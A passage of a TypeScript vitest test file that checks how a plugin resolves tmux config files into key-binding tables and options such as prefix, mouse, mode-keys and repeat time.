import { describe, expect, it } from "vitest";
import { STOCK_TMUX_BINDINGS, STOCK_TMUX_OPTIONS } from "./tmux-defaults";
import {
  MAX_TOTAL_ACTIONS,
  resolveTmuxConfig,
  stockTmuxConfig,
  tmuxConfigFrom,
  type ResolvedTmuxConfig,
  type TmuxEditorEnvironment,
  type TmuxKeyBinding,
  type TmuxOptions,
  type TmuxTableName,
} from "./tmux-keymap";
import { fileSources } from "./tmux-test-support";
import type { AfterCopy, CopyMotion, Direction, TmuxAction } from "./types";

const HOME_CONFIG = "~/.tmux.conf";
const XDG_CONFIG = "~/.config/tmux/tmux.conf";
const NO_EDITOR: TmuxEditorEnvironment = { visual: undefined, editor: undefined };
const TABLES: TmuxTableName[] = ["prefix", "root", "copyMode", "copyModeVi"];

const STOCK_OPTIONS: TmuxOptions = {
  prefix: null,
  prefix2: null,
  modeKeys: "emacs",
  mouse: false,
  repeatTimeMs: 500,
  prefixTimeoutMs: 0,
  baseIndex: 0,
};

// Every config of these tests is made up here. No file is read.
function resolve(text: string, environment = NO_EDITOR): ResolvedTmuxConfig {
  return resolveTmuxConfig([{ path: HOME_CONFIG, text }], environment);
}

function options(text: string, environment = NO_EDITOR): TmuxOptions {
  return resolve(text, environment).options;
}

function findBinding(
  config: ResolvedTmuxConfig,
  table: TmuxTableName,
  key: string,
): TmuxKeyBinding | undefined {
  return config.tables[table].find((binding) => binding.key === key);
}

function actionsOf(
  config: ResolvedTmuxConfig,
  table: TmuxTableName,
  key: string,
): TmuxAction[] | undefined {
  return findBinding(config, table, key)?.actions;
}

function withActions(bindings: readonly TmuxKeyBinding[]): TmuxKeyBinding[] {
  return bindings.filter((binding) => binding.actions.length > 0);
}

function keysOf(config: ResolvedTmuxConfig, table: TmuxTableName): string[] {
  return config.tables[table].map((binding) => binding.key);
}

function bound(
  key: string,
  actions: TmuxAction[],
  repeat = false,
): TmuxKeyBinding {
  return { key, repeat, actions };
}

function focus(direction: Direction): TmuxAction[] {
  return [{ type: "pane.focus", direction }];
}

function resize(direction: Direction, cells: number): TmuxAction[] {
  return [{ type: "pane.resize", direction, cells }];
}

function jump(index: number): TmuxAction[] {
  return [{ type: "thread.jump", index }];
}

function move(motion: CopyMotion): TmuxAction[] {
  return [{ type: "copy.move", motion }];
}

function scroll(direction: 1 | -1): TmuxAction[] {
  return [{ type: "copy.scroll", direction }];
}

function yank(after: AfterCopy): TmuxAction[] {
  return [{ type: "copy.yank", after }];
}

const CHOOSE: TmuxAction[] = [{ type: "chooser.open", placement: "replace" }];
const SPLIT_RIGHT: TmuxAction[] = [{ type: "chooser.open", placement: "right" }];
const SPLIT_DOWN: TmuxAction[] = [{ type: "chooser.open", placement: "down" }];
const BEGIN: TmuxAction[] = [{ type: "copy.beginSelection" }];
const CLEAR: TmuxAction[] = [{ type: "copy.clearSelection" }];
const EXIT: TmuxAction[] = [{ type: "copy.exit" }];

// The keys of tmux 3.5a (key-bindings.c) that bb has an equivalent for, in
// the order tmux lists them.
const STOCK_PREFIX_KEYS: TmuxKeyBinding[] = [
  bound("C-b", [{ type: "prefix.send", second: false }]),
  bound('"', SPLIT_DOWN),
  bound("%", SPLIT_RIGHT),
  bound("0", jump(1)),
  bound("1", jump(2)),
  bound("2", jump(3)),
  bound("3", jump(4)),
  bound("4", jump(5)),
  bound("5", jump(6)),
  bound("6", jump(7)),
  bound("7", jump(8)),
  bound("8", jump(9)),
  bound("9", jump(10)),
  bound(";", [{ type: "pane.last" }]),
  bound("?", [{ type: "help.open" }]),
  bound("[", [{ type: "copy.enter", motion: null }]),
  bound("c", [{ type: "thread.new" }]),
  bound("l", [{ type: "thread.last" }]),
  bound("n", [{ type: "thread.cycle", delta: 1 }]),
  bound("o", [{ type: "pane.next" }]),
  bound("p", [{ type: "thread.cycle", delta: -1 }]),
  bound("s", CHOOSE),
  bound("w", CHOOSE),
  bound("x", [{ type: "pane.close" }]),
  bound("z", [{ type: "pane.zoom" }]),
  bound("PageUp", [{ type: "copy.enter", motion: "page-up" }]),
  bound("ArrowUp", focus("up"), true),
  bound("ArrowDown", focus("down"), true),
  bound("ArrowLeft", focus("left"), true),
  bound("ArrowRight", focus("right"), true),
  bound("M-ArrowUp", resize("up", 5), true),
  bound("M-ArrowDown", resize("down", 5), true),
  bound("M-ArrowLeft", resize("left", 5), true),
  bound("M-ArrowRight", resize("right", 5), true),
  bound("C-ArrowUp", resize("up", 1), true),
  bound("C-ArrowDown", resize("down", 1), true),
  bound("C-ArrowLeft", resize("left", 1), true),
  bound("C-ArrowRight", resize("right", 1), true),
];

const STOCK_COPY_MODE_KEYS: TmuxKeyBinding[] = [
  bound("C-Space", BEGIN),
  bound("C-a", move("line-start")),
  bound("C-c", EXIT),
  bound("C-e", move("line-end")),
  bound("C-f", move("char-right")),
  bound("C-b", move("char-left")),
  bound("C-g", CLEAR),
  bound("C-n", move("line-down")),
  bound("C-p", move("line-up")),
  bound("C-v", move("page-down")),
  bound("C-w", yank("exit")),
  bound("Escape", EXIT),
  bound("Space", move("page-down")),
  bound("q", EXIT),
  bound("Home", move("line-start")),
  bound("End", move("line-end")),
  bound("PageDown", move("page-down")),
  bound("PageUp", move("page-up")),
  bound("ArrowUp", move("line-up")),
  bound("ArrowDown", move("line-down")),
  bound("ArrowLeft", move("char-left")),
  bound("ArrowRight", move("char-right")),
  bound("M-<", move("document-start")),
  bound("M->", move("document-end")),
  bound("M-S-r", move("screen-top")),
  bound("M-b", move("word-back")),
  bound("M-f", move("word-end")),
  bound("M-m", move("line-indent")),
  bound("M-r", move("screen-middle")),
  bound("M-v", move("page-up")),
  bound("M-w", yank("exit")),
  bound("M-{", move("paragraph-back")),
  bound("M-}", move("paragraph-forward")),
  bound("M-ArrowUp", move("half-page-up")),
  bound("M-ArrowDown", move("half-page-down")),
  bound("C-ArrowUp", scroll(-1)),
  bound("C-ArrowDown", scroll(1)),
];

const STOCK_COPY_MODE_VI_KEYS: TmuxKeyBinding[] = [
  bound("C-c", EXIT),
  bound("C-d", move("half-page-down")),
  bound("C-e", scroll(1)),
  bound("C-b", move("page-up")),
  bound("C-f", move("page-down")),
  bound("C-h", move("char-left")),
  bound("C-j", yank("exit")),
  bound("Enter", yank("exit")),
  bound("C-u", move("half-page-up")),
  bound("C-y", scroll(-1)),
  bound("Escape", CLEAR),
  bound("Space", BEGIN),
  bound("$", move("line-end")),
  bound("0", move("line-start")),
  bound("G", move("document-end")),
  bound("H", move("screen-top")),
  bound("J", scroll(1)),
  bound("K", scroll(-1)),
  bound("L", move("screen-bottom")),
  bound("M", move("screen-middle")),
  bound("^", move("line-indent")),
  bound("b", move("word-back")),
  bound("e", move("word-end")),
  bound("g", move("document-start")),
  bound("h", move("char-left")),
  bound("j", move("line-down")),
  bound("k", move("line-up")),
  bound("l", move("char-right")),
  bound("q", EXIT),
  bound("w", move("word-forward")),
  bound("{", move("paragraph-back")),
  bound("}", move("paragraph-forward")),
  bound("Home", move("line-start")),
  bound("End", move("line-end")),
  bound("Backspace", move("char-left")),
  bound("PageDown", move("page-down")),
  bound("PageUp", move("page-up")),
  bound("ArrowUp", move("line-up")),
  bound("ArrowDown", move("line-down")),
  bound("ArrowLeft", move("char-left")),
  bound("ArrowRight", move("char-right")),
  bound("C-ArrowUp", scroll(-1)),
  bound("C-ArrowDown", scroll(1)),
];

describe("stock tmux", () => {
  const stock = resolveTmuxConfig([]);

  it("has the options that tmux starts with", () => {
    expect(stock.options).toEqual(STOCK_OPTIONS);
    expect(STOCK_TMUX_OPTIONS).toEqual({
      prefix: "C-b",
      modeKeys: "emacs",
      mouse: false,
      repeatTimeMs: 500,
      prefixTimeoutMs: 0,
      baseIndex: 0,
    });
  });

  it("binds every key of the prefix table that bb has an equivalent for", () => {
    expect(withActions(stockTmuxConfig().tables.prefix)).toEqual(STOCK_PREFIX_KEYS);
  });

  it("binds the keys of the emacs copy table", () => {
    expect(withActions(stockTmuxConfig().tables.copyMode)).toEqual(
      STOCK_COPY_MODE_KEYS,
    );
  });

  it("binds the keys of the vi copy table", () => {
    expect(withActions(stockTmuxConfig().tables.copyModeVi)).toEqual(
      STOCK_COPY_MODE_VI_KEYS,
    );
  });

  it("binds no key without the prefix", () => {
    expect(stock.tables.root).toEqual([]);
  });

  it("binds every keyboard key of tmux, 87 after the prefix and 65 and 80 in the copy tables", () => {
    expect(stock.tables.prefix).toHaveLength(87);
    expect(stock.tables.copyMode).toHaveLength(65);
    expect(stock.tables.copyModeVi).toHaveLength(80);
    expect(STOCK_TMUX_BINDINGS.match(/^bind /gm)).toHaveLength(87 + 65 + 80);
  });

  it.each([
    ["C-o", "C-o"],
    ["Space", "Space"],
    ["!", "!"],
    ["#", "#"],
    ["$", "$"],
    ["&", "&"],
    ["'", "'"],
    [",", ","],
    ["-", "-"],
    [".", "."],
    [":", ":"],
    ["=", "="],
    ["D", "D"],
    ["]", "]"],
    ["d", "d"],
    ["f", "f"],
    ["i", "i"],
    ["q", "q"],
    ["r", "r"],
    ["t", "t"],
    ["{", "{"],
    ["}", "}"],
    ["~", "~"],
    ["M-1", "M-1"],
    ["M-n", "M-n"],
    ["M-p", "M-p"],
    ["S-Up", "S-ArrowUp"],
    ["DC", "Delete"],
    ["<", "<"],
    [">", ">"],
  ])("takes the key %s after the prefix and does nothing with it", (_tmuxName, key) => {
    const binding = findBinding(stock, "prefix", key);

    expect(binding?.actions).toEqual([]);
    expect(findBinding(stockTmuxConfig(), "prefix", key)).toEqual(binding);
  });

  it("lets the keys that scroll the window and reset it repeat, as tmux does", () => {
    expect(findBinding(stock, "prefix", "S-ArrowUp")?.repeat).toBe(true);
    expect(findBinding(stock, "prefix", "Delete")?.repeat).toBe(true);
    expect(findBinding(stock, "prefix", "M-1")?.repeat).toBe(false);
  });

  it.each([
    ["copyMode", "C-r"],
    ["copyMode", "C-k"],
    ["copyMode", "g"],
    ["copyMode", "n"],
    ["copyMode", "M-1"],
    ["copyMode", "C-M-b"],
    ["copyModeVi", "/"],
    ["copyModeVi", "?"],
    ["copyModeVi", "v"],
    ["copyModeVi", "V"],
    ["copyModeVi", "C-v"],
    ["copyModeVi", "o"],
    ["copyModeVi", "W"],
    ["copyModeVi", "1"],
    ["copyModeVi", "#"],
    ["copyModeVi", "%"],
    ["copyModeVi", "z"],
  ] as const)("takes the key %s %s and does nothing with it", (table, key) => {
    expect(actionsOf(stock, table, key)).toEqual([]);
    expect(actionsOf(stockTmuxConfig(), table, key)).toEqual([]);
  });

  it.each([
    ["prefix", "h"],
    ["prefix", "j"],
    ["prefix", "k"],
    ["prefix", "v"],
    ["prefix", "|"],
    ["prefix", "M-h"],
    ["prefix", "M-j"],
    ["prefix", "M-k"],
    ["prefix", "M-l"],
    ["prefix", "Escape"],
    ["copyModeVi", "y"],
    ["copyModeVi", "i"],
    ["copyMode", "h"],
    ["copyMode", "v"],
    ["copyMode", "y"],
    ["root", "i"],
  ] as const)("binds nothing to %s %s, which stock tmux does not bind", (table, key) => {
    expect(findBinding(stock, table, key)).toBeUndefined();
  });

  it("knows no file, no pasted text and nothing that could not be read", () => {
    const config = stockTmuxConfig();

    expect(config.files).toEqual([]);
    expect(config.unreadable).toBe(false);
    expect(config.namedFile).toBe(false);
    expect(config.pastedText).toBe("none");
    expect(config.options).toEqual(STOCK_OPTIONS);
  });

  it("is the same for a config that is empty, or that only holds comments", () => {
    expect(resolve("")).toEqual(stock);
    expect(resolve("# my tmux config\n\n")).toEqual(stock);
  });
});

describe("options", () => {
  it.each([
    "set -g mouse on",
    "set-option -g mouse on",
    "setw -g mouse on",
    "set-window-option -g mouse on",
    "set-o -g mouse on",
    "set -gq mouse on",
    "set -sg mouse on",
    "set -g -q mouse on",
    'set -g mouse "on"',
    "set -g mouse",
    "set -g mouse yes",
    "set -g mouse 1",
    "set -g mouse ON",
    "set -g mouse Yes",
  ])("turns the mouse on with %j", (text) => {
    expect(options(text)).toEqual({ ...STOCK_OPTIONS, mouse: true });
  });

  it.each([
    "set mouse on",
    "set -go mouse on",
    "set -gz mouse on",
    "set -g mouse true",
    "set -g mouse 2",
    "set -g mouse on off",
    "set -g mouse $MOUSE",
    "set -gF mouse '#{x}'",
    "set -g mouse { on }",
    "set -t { x } -g mouse on",
    "set -g @mouse on",
    "bind m set -g mouse on",
    "if-shell true { set -g mouse on }",
    "%if 1\nset -g mouse on\n%endif",
  ])("leaves the mouse off with %j", (text) => {
    expect(options(text)).toEqual(STOCK_OPTIONS);
  });

  it.each(["off", "no", "0", "Off", "NO"])(
    "turns the mouse off again with the value %s, as tmux does",
    (value) => {
      expect(options(`set -g mouse on\nset -g mouse ${value}`).mouse).toBe(false);
    },
  );

  it("turns the mouse off again, by name or by a line without a value", () => {
    expect(options("set -g mouse on\nset -g mouse off").mouse).toBe(false);
    expect(options("set -g mouse on\nset -g mouse").mouse).toBe(false);
    expect(options("set -g mouse on\nset -gu mouse").mouse).toBe(false);
  });

  it.each([
    ["set -g mode-keys vi", "vi"],
    ["setw -g mode-keys vi", "vi"],
    ["set-window-option -g mode-keys vi", "vi"],
    ["set -wg mode-keys vi", "vi"],
    ["set -g mode-keys vi\nset -g mode-keys emacs", "emacs"],
    ["set -g mode-keys vi\nset -g mode-keys vim", "vi"],
    ["set -g mode-keys Vi", "emacs"],
    ["set -g mode-keys", "vi"],
    ["setw -g mode-keys\nsetw -g mode-keys", "emacs"],
    ["setw -g mode-keys vi\nsetw -g mode-keys", "emacs"],
    ["setw mode-keys", "emacs"],
    ["setw mode-keys vi", "emacs"],
    ["set -g status-keys vi", "emacs"],
  ] as const)("reads %j as mode-keys %s", (text, modeKeys) => {
    expect(options(text).modeKeys).toBe(modeKeys);
  });

  it.each([
    ["set -g repeat-time 1000", 1000],
    ["set -g repeat-time 0", 0],
    ["set -g repeat-time 32767", 32767],
    ["set-option -g repeat-time 250", 250],
    ["set -g repeat-time 32768", 500],
    ["set -g repeat-time -1", 500],
    ["set -g repeat-time 1.5", 500],
    ["set -g repeat-time fast", 500],
    ["set -g repeat-time", 500],
    ["set -g repeat-time 900\nset -gu repeat-time", 500],
  ])("reads %j as a repeat time of %d ms", (text, repeatTimeMs) => {
    expect(options(text).repeatTimeMs).toBe(repeatTimeMs);
  });

  it.each([
    ["set -g prefix-timeout 1000", 1000],
    ["set -s prefix-timeout 1000", 1000],
    ["set prefix-timeout 1000", 1000],
    ["set-option -sq prefix-timeout 250", 250],
    ["set -g prefix-timeout 1000\nset -g prefix-timeout 0", 0],
    ["set -g prefix-timeout 2147483647", 2147483647],
    ["set -g prefix-timeout 2147483648", 0],
    ["set -g prefix-timeout -1", 0],
    ["set -g prefix-timeout soon", 0],
    ["set -g prefix-timeout", 0],
    ["set -o prefix-timeout 1000", 0],
    ["set -z prefix-timeout 1000", 0],
    ["set -g prefix-timeout $TIME", 0],
    ["set -g prefix-timeout 900\nset -u prefix-timeout", 0],
    ["set -g prefix-timeout 900\nset -gu prefix-timeout", 0],
  ])("reads %j as a prefix timeout of %d ms, 0 for none", (text, prefixTimeoutMs) => {
    expect(options(text).prefixTimeoutMs).toBe(prefixTimeoutMs);
  });

  it("only takes a line without -g for an option of the whole server", () => {
    const text = [
      "set prefix-timeout 700",
      "set repeat-time 700",
      "set base-index 7",
      "set mouse on",
      "set prefix C-a",
    ].join("\n");

    expect(options(text)).toEqual({ ...STOCK_OPTIONS, prefixTimeoutMs: 700 });
  });

  it.each([
    ["set -g base-index 1", 1],
    ["set -g base-index 0", 0],
    ["set -g base-index 10", 10],
    ["set -g base-index one", 0],
    ["set -g base-index 2147483648", 0],
    ["set -g pane-base-index 1", 0],
    ["set -g base-index 1\nset -gu base-index", 0],
  ])("reads %j as a base index of %d", (text, baseIndex) => {
    expect(options(text).baseIndex).toBe(baseIndex);
  });

  it("reads the prefix with the file that sets it", () => {
    expect(options("set -g prefix C-a").prefix).toEqual({
      key: "C-a",
      path: HOME_CONFIG,
      usable: true,
    });
  });

  it("keeps a prefix that bb cannot use, as it is written", () => {
    expect(options("set -g prefix `").prefix).toEqual({
      key: "`",
      path: HOME_CONFIG,
      usable: false,
    });
    expect(options("set -g prefix None").prefix).toEqual({
      key: "None",
      path: HOME_CONFIG,
      usable: false,
    });
  });

  it.each([
    ["set -g prefix2 C-s", { key: "C-s", path: HOME_CONFIG, usable: true }],
    ["set-option -g prefix2 M-a", { key: "M-a", path: HOME_CONFIG, usable: true }],
    ["set -g prefix2 F12", { key: "F12", path: HOME_CONFIG, usable: true }],
    ["set -g prefix2 `", { key: "`", path: HOME_CONFIG, usable: false }],
    ["set -g prefix2 nonsense", { key: "nonsense", path: HOME_CONFIG, usable: false }],
    ["set -g prefix2 C-\u0130", { key: "C-\u0130", path: HOME_CONFIG, usable: false }],
    ["set -g prefix2 M-\u0130", { key: "M-\u0130", path: HOME_CONFIG, usable: false }],
    ["set -g prefix2 None", null],
    ["set -g prefix2 none", null],
    ["set -g prefix2 C-s\nset -g prefix2 None", null],
    ["set -g prefix2 C-s\nset -gu prefix2", null],
    ["set prefix2 C-s", null],
    ["set -g prefix2", null],
  ])("reads %j as the second prefix %j", (text, prefix2) => {
    expect(options(text).prefix2).toEqual(prefix2);
  });

  it("sets the two prefixes apart", () => {
    const found = options("set -g prefix C-a\nset -g prefix2 C-b");

    expect(found.prefix?.key).toBe("C-a");
    expect(found.prefix2?.key).toBe("C-b");
  });

  it("ignores an option that it does not know", () => {
    const text = [
      "set -g status-style bg=blue",
      "set -g escape-time 0",
      "set -s escape-time 0",
      "set -g default-terminal tmux-256color",
      "set -g @plugin tmux-plugins/tpm",
    ].join("\n");

    expect(resolve(text)).toEqual(resolveTmuxConfig([]));
  });

  it("leaves every key of stock tmux in place for a config that only sets options", () => {
    const text = [
      "set -g prefix C-a",
      "set -g prefix2 C-s",
      "setw -g mode-keys vi",
      "set -g mouse on",
      "set -g repeat-time 800",
      "set -s prefix-timeout 1500",
      "set -g base-index 0",
    ].join("\n");
    const config = resolve(text);

    expect(config.options).toEqual({
      prefix: { key: "C-a", path: HOME_CONFIG, usable: true },
      prefix2: { key: "C-s", path: HOME_CONFIG, usable: true },
      modeKeys: "vi",
      mouse: true,
      repeatTimeMs: 800,
      prefixTimeoutMs: 1500,
      baseIndex: 0,
    });
    expect(config.tables).toEqual(resolveTmuxConfig([]).tables);
    expect(actionsOf(config, "prefix", "C-b")).toEqual([
      { type: "prefix.send", second: false },
    ]);
  });
});

describe("mode-keys from VISUAL and EDITOR", () => {
  it.each([
    [{ visual: "vim", editor: undefined }, "vi"],
    [{ visual: undefined, editor: "vi" }, "vi"],
    [{ visual: undefined, editor: "/usr/bin/nvim" }, "vi"],
    [{ visual: "nvim -u NONE", editor: "nano" }, "vi"],
    [{ visual: undefined, editor: "emacs" }, "emacs"],
    [{ visual: undefined, editor: "nano" }, "emacs"],
    [{ visual: "code --wait", editor: "vim" }, "emacs"],
    [{ visual: "", editor: "vim" }, "emacs"],
    [{ visual: undefined, editor: "" }, "emacs"],
    [{ visual: undefined, editor: "VIM" }, "emacs"],
    [{ visual: undefined, editor: undefined }, "emacs"],
    [{ visual: undefined, editor: "/home/david/bin/nano" }, "emacs"],
    [{ visual: "/opt/review/bin/emacs", editor: "vim" }, "emacs"],
    [{ visual: undefined, editor: "/opt/services/bin/nvim" }, "vi"],
    [{ visual: undefined, editor: "vim -u /home/me/nanorc" }, "emacs"],
    [{ visual: undefined, editor: "nano /home/me/vimrc" }, "vi"],
    [{ visual: undefined, editor: "/usr/bin/vi/" }, "emacs"],
  ] as const)("starts from %j with mode-keys %s", (environment, modeKeys) => {
    expect(resolveTmuxConfig([], environment).options.modeKeys).toBe(modeKeys);
  });

  it("lets the config override what the editor says, either way", () => {
    const vim = { visual: undefined, editor: "vim" };

    expect(options("set -g mode-keys emacs", vim).modeKeys).toBe("emacs");
    expect(options("set -g mouse on", vim).modeKeys).toBe("vi");
    expect(options("setw -g mode-keys vi").modeKeys).toBe("vi");
  });

  it("goes back to emacs, the default of tmux, when the option is unset, whatever the editor says", () => {
    const vim = { visual: "vim", editor: undefined };

    expect(options("set -gu mode-keys", vim).modeKeys).toBe("emacs");
    expect(options("set -gU mode-keys", vim).modeKeys).toBe("emacs");
    expect(options("set -g mode-keys vi\nset -gu mode-keys").modeKeys).toBe("emacs");
  });

  it("turns over what the editor says with a line that names no value", () => {
    const vim = { visual: "vim", editor: undefined };

    expect(options("setw -g mode-keys", vim).modeKeys).toBe("emacs");
  });

  it("changes no key: both copy tables are always there", () => {
    const vim = resolveTmuxConfig([], { visual: "vim", editor: undefined });

    expect(vim.tables).toEqual(resolveTmuxConfig([]).tables);
  });
});

describe("mode-keys from a Windows path in EDITOR, as the server hands it on", () => {
  it.each([
    ["C:/Users/david/AppData/Local/Programs/Microsoft VS Code/Code.exe", "emacs"],
    ["C:/Program Files/Services/nano.exe", "emacs"],
    ["C:/Program Files/Vim/vim91/gvim.exe", "vi"],
  ] as const)("takes %j for %s keys", (editor, modeKeys) => {
    expect(options("", { visual: undefined, editor }).modeKeys).toBe(modeKeys);
  });
});

describe("escapes in a config line", () => {
  it("binds Space for the key that is written as a backslash and s, and leaves the letter s alone", () => {
    const config = resolve('bind "\\s" kill-pane');

    expect(actionsOf(config, "prefix", "Space")).toEqual([{ type: "pane.close" }]);
    expect(actionsOf(config, "prefix", "s")).toEqual(
      actionsOf(resolve(""), "prefix", "s"),
    );
  });

  it("shows the space of a message that is written with a backslash and s", () => {
    const config = resolve('bind m display "saved\\sto\\sdisk"');

    expect(actionsOf(config, "prefix", "m")).toEqual([
      { type: "notice.show", text: "saved to disk" },
    ]);
  });

  it.each(['bind "\\e" copy-mode', 'bind "\\001" kill-pane', 'bind "\\t" kill-pane'])(
    "binds no key with %j, a character that tmux has no key for",
    (text) => {
      expect(resolve(text).tables).toEqual(resolve("").tables);
    },
  );

  it("runs the command behind a NAME=value", () => {
    const config = resolve("PREFIX=C-a set -g prefix C-a\nFOO=bar bind y kill-pane");

    expect(config.options.prefix).toMatchObject({ key: "C-a", usable: true });
    expect(actionsOf(config, "prefix", "y")).toEqual([{ type: "pane.close" }]);
  });

  it("runs the command behind a NAME=value whose value holds a variable", () => {
    const config = resolve("FOO=$HOME/x set -g mouse on\nBAR=${HOME}/y bind y kill-pane");

    expect(config.options.mouse).toBe(true);
    expect(actionsOf(config, "prefix", "y")).toEqual([{ type: "pane.close" }]);
  });

  it("reloads the config for a source-file with a variable in braces", () => {
    const config = resolve("bind r source-file ${HOME}/.tmux.conf \\; display reloaded");

    expect(actionsOf(config, "prefix", "r")).toEqual([
      { type: "config.reload" },
      { type: "notice.show", text: "reloaded" },
    ]);
  });

  it.each([
    ["bind m {\n  run-shell ${HOME}/bin/toggle\n  set -g mouse on\n  set -g prefix C-t\n  bind y kill-pane\n}"],
    ["if-shell true {\n  set -g default-shell ${SHELL}\n  set -g mouse on\n  set -g prefix C-t\n  bind y kill-pane\n}"],
    ["if-shell true {\n  display ${FOO:-a b}\n  set -g mouse on\n  set -g prefix C-t\n  bind y kill-pane\n}"],
    ["bind m {\n  display ${FOO;bar}\n  set -g mouse on\n  set -g prefix C-t\n  bind y kill-pane\n}"],
  ])("applies nothing of the block in %j", (text) => {
    const config = resolve(text);

    expect(config.options).toEqual(resolve("").options);
    expect(findBinding(config, "prefix", "y")).toBeUndefined();
  });

  it("shows the UTF-8 character that a message spells with octal escapes", () => {
    const config = resolve('bind y display "caf\\303\\251"');

    expect(actionsOf(config, "prefix", "y")).toEqual([
      { type: "notice.show", text: "caf\u00e9" },
    ]);
  });

  it("skips a line with an octal escape that tmux refuses, and keeps the binding from before", () => {
    const config = resolve('bind c display "a\\477b"');

    expect(actionsOf(config, "prefix", "c")).toEqual([{ type: "thread.new" }]);
  });
});

describe("bind-key", () => {
  it.each([
    "bind g kill-pane",
    "bind-key g kill-pane",
    "bi g kill-pane",
    "bind -T prefix g kill-pane",
    "bind -Tprefix g kill-pane",
    "bind 'g' kill-pane",
    "bind -N 'Close it' g kill-pane",
    "bind -N note -- g kill-pane",
  ])(
    "binds a key after the prefix with %j",
    (text) => {
      const config = resolve(text);

      expect(findBinding(config, "prefix", "g")).toEqual(
        bound("g", [{ type: "pane.close" }]),
      );
      expect(findBinding(config, "root", "g")).toBeUndefined();
    },
  );

  it.each([
    "bind -n M-h select-pane -L",
    "bind -T root M-h select-pane -L",
    "bind-key -n M-h select-pane -L",
    "bind -n -T root M-h select-pane -L",
  ])(
    "binds a key without the prefix with %j",
    (text) => {
      const config = resolve(text);

      expect(config.tables.root).toEqual([bound("M-h", focus("left"))]);
      expect(findBinding(config, "prefix", "M-h")).toBeUndefined();
    },
  );

  it("lets -T decide over -n", () => {
    const config = resolve("bind -n -T copy-mode-vi y send -X cancel");

    expect(actionsOf(config, "copyModeVi", "y")).toEqual(EXIT);
    expect(config.tables.root).toEqual([]);
  });

  it.each([
    "bind -r H resize-pane -L 5",
    "bind -rT prefix H resize-pane -L 5",
    "bind -N note -r H resize-pane -L 5",
  ])(
    "lets a key repeat with %j",
    (text) => {
      expect(findBinding(resolve(text), "prefix", "H")).toEqual(
        bound("H", resize("left", 5), true),
      );
    },
  );

  it("binds in the two copy tables apart", () => {
    const config = resolve(
      "bind -T copy-mode-vi v send -X begin-selection\nbind -Tcopy-mode C-y send -X scroll-up",
    );

    expect(actionsOf(config, "copyModeVi", "v")).toEqual(BEGIN);
    expect(findBinding(config, "copyMode", "v")).toBeUndefined();
    expect(actionsOf(config, "copyMode", "C-y")).toEqual(scroll(-1));
    expect(actionsOf(config, "copyModeVi", "C-y")).toEqual(scroll(-1));
  });

  it("does not cut a long key that cannot be a prefix in the middle of a character", () => {
    const emoji = "\u{1f600}";

    expect(options(`set -g prefix '${"p".repeat(31)}${emoji}tail'`).prefix).toEqual({
      key: `${"p".repeat(31)}...`,
      path: HOME_CONFIG,
      usable: false,
    });
  });

  it("writes the key in the notation of this plugin", () => {
    const config = resolve(
      [
        "bind -n C-M-Left previous-window",
        "bind BTab last-pane",
        "bind C-A kill-pane",
        "bind '\\' split-window -h",
      ].join("\n"),
    );

    expect(config.tables.root).toEqual([
      bound("C-M-ArrowLeft", [{ type: "thread.cycle", delta: -1 }]),
    ]);
    expect(findBinding(config, "prefix", "S-Tab")).toEqual(
      bound("S-Tab", [{ type: "pane.last" }]),
    );
    expect(findBinding(config, "prefix", "C-a")).toEqual(
      bound("C-a", [{ type: "pane.close" }]),
    );
    expect(findBinding(config, "prefix", "\\")?.actions).toEqual(SPLIT_RIGHT);
  });

  it("keeps the key, the repeat mark and the actions of a binding, and not how the config writes the key", () => {
    const config = resolve("bind BTab last-pane\nbind -r C-A kill-pane");
    const bindings = TABLES.flatMap((table) => config.tables[table]);

    expect(bindings.length).toBeGreaterThan(200);
    for (const binding of bindings) {
      expect(Object.keys(binding).sort()).toEqual(["actions", "key", "repeat"]);
    }
    expect(JSON.stringify(config)).not.toContain('"BTab"');
    expect(JSON.stringify(config)).not.toContain('"C-A"');
  });

  it.each([
    "bind -T resize h resize-pane -L",
    "bind -T $table g kill-pane",
    "bind -x g kill-pane",
    "bind -t vi-copy v begin-selection",
    "bind -T prefix",
    "bind",
    "bind -n",
    "bind MouseDown1Pane select-pane -L",
    "bind KP1 kill-pane",
    "bind F13 kill-pane",
    "bind Any kill-pane",
    "bind $KEY kill-pane",
    "bind ~ kill-pane",
    `bind ${"C-".repeat(40)}a kill-pane`,
    "bind { g } kill-pane",
  ])("changes nothing with %j", (text) => {
    expect(resolve(text)).toEqual(resolveTmuxConfig([]));
  });

  it("only changes the note of a key that is bound again without a command", () => {
    const config = resolve("bind -N 'Start a thread' c\nbind -r n");

    expect(findBinding(config, "prefix", "c")).toEqual(
      bound("c", [{ type: "thread.new" }]),
    );
    expect(findBinding(config, "prefix", "n")?.repeat).toBe(false);
  });

  it("replaces what a key was bound to, and moves the key behind the others", () => {
    const config = resolve("bind c kill-pane");

    expect(actionsOf(config, "prefix", "c")).toEqual([{ type: "pane.close" }]);
    expect(config.tables.prefix).toHaveLength(87);
    expect(config.tables.prefix.at(-1)?.key).toBe("c");
  });

  it("takes a key that is bound to a command bb has no equivalent for, and drops what it did", () => {
    const config = resolve("bind c rotate-window\nbind -n M-x if-shell true 'kill-pane'");

    expect(actionsOf(config, "prefix", "c")).toEqual([]);
    expect(actionsOf(config, "root", "M-x")).toEqual([]);
  });

  it("drops the repeat of a key that is bound again without -r", () => {
    const config = resolve("bind Up select-pane -U\nbind -r c new-window");

    expect(findBinding(config, "prefix", "ArrowUp")?.repeat).toBe(false);
    expect(findBinding(config, "prefix", "c")?.repeat).toBe(true);
  });

  it("binds every key of a line that holds several bind commands", () => {
    const config = resolve("bind g kill-pane ; bind G resize-pane -Z");

    expect(actionsOf(config, "prefix", "g")).toEqual([{ type: "pane.close" }]);
    expect(actionsOf(config, "prefix", "G")).toEqual([{ type: "pane.zoom" }]);
  });

  it("does not run a bind that stands inside another command", () => {
    const text = [
      "if-shell true { bind g kill-pane }",
      "bind r { bind g kill-pane }",
      'run-shell "tmux bind g kill-pane"',
      "%if 1\nbind g kill-pane\n%endif",
    ].join("\n");

    expect(findBinding(resolve(text), "prefix", "g")).toBeUndefined();
  });

  it.each([`bind "~" kill-pane`, `bind ~ kill-pane`, `bind "~" split-window`])(
    "leaves the stock key ~ as it is for %j, whose key tmux turns into the home directory",
    (text) => {
      const stock = resolveTmuxConfig([]);

      expect(findBinding(resolve(text), "prefix", "~")).toEqual(
        findBinding(stock, "prefix", "~"),
      );
      expect(actionsOf(resolve("bind '~' kill-pane"), "prefix", "~")).toEqual([
        { type: "pane.close" },
      ]);
    },
  );

  // tmux reports such a line as an error and leaves the key alone
  // (cmd_bind_key_exec in cmd-bind-key.c).
  it.each([
